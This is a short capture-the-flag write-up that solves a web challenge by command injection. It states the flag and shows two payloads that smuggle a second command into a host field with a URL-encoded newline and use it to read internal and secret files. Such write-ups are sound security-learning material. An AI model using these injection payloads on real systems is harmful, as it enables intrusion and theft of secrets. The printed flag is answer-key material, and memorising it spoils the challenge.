# Challenge name
Aethercorp NetprobeX

## My solve 
**Flag:** `citadel{bl4ck51t3_4cc3ss_gr4nt3d}`

The website requires us to pass the `%0A` spacer to allow chaining commands. Upon lsing various directories, we pass 
```bash
127.1%0Atail -n +1 /app/mission_briefing.txt
```
Which gives an idea of what we're looking for
Upon futher examination of the system. we finally pass
```bash
127.1%0Atail -n +1 /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
```
which gives us the flag.